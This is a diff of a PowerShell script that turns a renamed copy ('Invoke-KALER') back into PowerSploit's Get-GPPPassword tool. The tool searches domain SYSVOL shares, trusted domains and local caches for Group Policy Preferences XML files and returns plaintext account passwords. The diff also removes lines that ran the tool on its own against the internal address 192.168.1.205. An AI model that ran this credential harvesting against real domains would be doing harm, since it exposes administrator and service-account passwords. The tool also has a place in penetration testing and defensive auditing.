@@ -1,4 +1,92 @@
-function Invoke-KALER {
+function Get-GPPPassword {
+<#
+.SYNOPSIS
+
+Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+
+PowerSploit Function: Get-GPPPassword  
+Author: Chris Campbell (@obscuresec)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
+
+.DESCRIPTION
+
+Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
+
+.PARAMETER Server
+
+Specify the domain controller to search for.
+Default's to the users current domain
+
+.PARAMETER SearchForest
+
+Map all reaschable trusts and search all reachable SYSVOLs.
+
+.EXAMPLE
+
+Get-GPPPassword
+
+NewName   : [BLANK]
+Changed   : {2014-02-21 05:28:53}
+Passwords : {password12}
+UserNames : {test1}
+File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
+
+NewName   : {mspresenters}
+Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
+Passwords : {Recycling*3ftw!, password123, password1234}
+UserNames : {Administrator (built-in), DummyAccount, dummy2}
+File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
+
+NewName   : [BLANK]
+Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
+Passwords : {password, password1234$}
+UserNames : {administrator, admin}
+File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
+
+NewName   : [BLANK]
+Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
+Passwords : {password, read123}
+UserNames : {DEMO\Administrator, admin}
+File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
+
+.EXAMPLE
+
+Get-GPPPassword -Server EXAMPLE.COM
+
+NewName   : [BLANK]
+Changed   : {2014-02-21 05:28:53}
+Passwords : {password12}
+UserNames : {test1}
+File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
+
+NewName   : {mspresenters}
+Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
+Passwords : {Recycling*3ftw!, password123, password1234}
+UserNames : {Administrator (built-in), DummyAccount, dummy2}
+File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml
+
+.EXAMPLE
+
+Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
+
+password
+password12
+password123
+password1234
+password1234$
+read123
+Recycling*3ftw!
+
+.LINK
+
+http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
+https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
+http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
+http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
+#>
+
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
@@ -220,11 +308,11 @@ function Invoke-KALER {
         }
 
         # discover any locally cached GPP .xml files
-        Write-Verbose '[Invoke-KALER] Searching local host for any cached GPP files'
+        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
         $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
 
         if ($SearchForest) {
-            Write-Verbose '[Invoke-KALER] Searching for all reachable trusts'
+            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
             $Domains += Get-DomainTrustMapping
         }
         else {
@@ -241,7 +329,7 @@ function Invoke-KALER {
 
         ForEach ($Domain in $Domains) {
             # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
-            Write-Verbose "[Invoke-KALER] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
+            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
             $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
 
             if($DomainXMLFiles) {
@@ -249,9 +337,9 @@ function Invoke-KALER {
             }
         }
 
-        if ( -not $XMLFiles ) { throw '[Invoke-KALER] No preference files found.' }
+        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }
 
-        Write-Verbose "[Invoke-KALER] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
+        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
 
         ForEach ($File in $XMLFiles) {
             $Result = (Get-GppInnerField $File.Fullname)
@@ -261,7 +349,3 @@ function Invoke-KALER {
 
     catch { Write-Error $Error[0] }
 }
-
-
-Invoke-KALER
-Invoke-KALER -Server 192.168.1.205
